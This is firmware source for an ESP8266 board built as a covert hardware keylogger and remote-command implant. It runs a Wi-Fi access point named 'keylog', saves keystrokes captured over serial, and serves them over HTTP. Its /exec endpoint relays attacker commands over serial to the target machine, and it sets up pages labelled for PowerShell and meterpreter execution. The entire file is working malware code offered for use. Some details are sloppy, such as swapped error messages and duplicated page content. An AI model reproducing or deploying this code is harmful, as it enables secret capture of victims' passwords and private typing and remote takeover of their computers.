#include <ESP8266WiFi.h>
#include <FS.h>
#include <ESP8266mDNS.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFSEditor.h>
#include <EEPROM.h>
#include "htmlpages.h"
#define BAUD_RATE 9600

/* ============= CHANGE WIFI CREDENTIALS ============= */
const char *ssid = "keylog";
const char *password = "password"; //min 8 chars
/* ============= ======================= ============= */

AsyncWebServer server(80);
FSInfo fs_info;



File keystrokes;
File exec_ps_page;
File down_exec_page;
File exec_cmd_page;
File run_page;
File sendraw_page;

const int wifiSS = D1;

void setup() {
  
  Serial.begin(BAUD_RATE);
  
 
  
  //Serial.println(WiFi.SSID());
  WiFi.mode(WIFI_STA);
  WiFi.softAP(ssid,password);
  
  EEPROM.begin(4096);
  SPIFFS.begin();
  

  
  MDNS.addService("http","tcp",80);
pinMode(wifiSS, OUTPUT);
digitalWrite(wifiSS,HIGH);
  keystrokes = SPIFFS.open("/keystrokes.txt", "a+");
  exec_cmd_page = SPIFFS.open("/exec_cmd.html", "w+");
  exec_ps_page = SPIFFS.open("/exec_ps.html", "w+");
  
  if(!keystrokes) Serial.println("keystrokes file open failed");
  if(!exec_ps_page) Serial.println("meterpreter file open failed");
  if(!exec_cmd_page) Serial.println("powershell file open failed");
  
//---------------------start-keylog---------------------------
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/keystrokes.txt", "text/plain");
  });
  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request){
    keystrokes.close();
    keystrokes = SPIFFS.open("/keystrokes.txt", "w");
    request->send(200, "text/plain", "file cleared!");
  });
//---------------------end-of-keylog--------------------------

//---------------------start-command-exec----------------------
 server.on("/exec", HTTP_GET, [](AsyncWebServerRequest *request){
  int paramsNr = request->params();
 String message = "";
 digitalWrite(wifiSS, LOW);
 delay(6);
/*
bool flag = true;
unsigned long previousMillis = 0;        // will store last time LED was updated

// constants won't change :
const long timeout = 3500;
const long interval = 200;  

  while(flag)
  {
      Serial.print("_5ed33_");
      if(Serial.available() > 0)
      {
        String answer = Serial.readString();
        keystrokes.print(answer);
        
           if(answer.indexOf("_444bcb_") > -1)
           {
            flag = false;
           }
      }      
      
      unsigned long currentMillis = millis();
      
      if (currentMillis - previousMillis >= timeout) 
      {
           flag = false;
           previousMillis = currentMillis;
      }
  }

  
  Serial.flush();
  previousMillis = 0; 
flag = true;
while(flag)
  {    
      if(Serial.available() > 0)
      {
        String answer = Serial.readString();
        keystrokes.print(answer);
      }
      
      unsigned long currentMillis = millis();
      
      if (currentMillis - previousMillis >= interval) 
      {
           flag = false;
           previousMillis = currentMillis;
      }
  }
*/
 for(int i = 0;i < 110; i++) 
    {
      Serial.print("_5ed33_");
    }
    
Serial.flush();
Serial.end();
unsigned long previousMillis = 0;        
const long interval = 50;  
unsigned long currentMillis = millis();
     while (currentMillis - previousMillis >= 100 ) 
     {     
          currentMillis = millis();           
          previousMillis = currentMillis;
      }
      
    Serial.begin(9600);
    previousMillis = 0;
    currentMillis = millis();
     while (currentMillis - previousMillis >= 100) 
     {     
          currentMillis = millis();           
          previousMillis = currentMillis;
      }
      
    for(int i=0;i<paramsNr;i++){
         
        AsyncWebParameter* p = request->getParam(i);
       
        message += p->name() + ":";
       
        if(i + 1 != paramsNr)
        message += p->value() + "***";
        else
        message += p->value();
        
   
    }
    message += "_end_" ;
    request->send(200, "text/plain", message);
    
    

     
   
   
 

      Serial.print(message);

 
    digitalWrite(wifiSS, HIGH);
   
 


  
  });



  String psPageCodes= PS_page;
  exec_ps_page.print(psPageCodes);
  
  server.on("/exec_ps", [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/exec_ps.html", "text/html");
  }); 
 


  String cmdPageCodes= PS_page;
  exec_cmd_page.print(cmdPageCodes);

  
  server.on("/exec_cmd", [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/exec_cmd.html", "text/html");
  });  
  server.begin();

keystrokes.print("test");
 }

void loop() {
  
  if(Serial.available() > 0) {
    keystrokes.print(Serial.readString());
  }

}
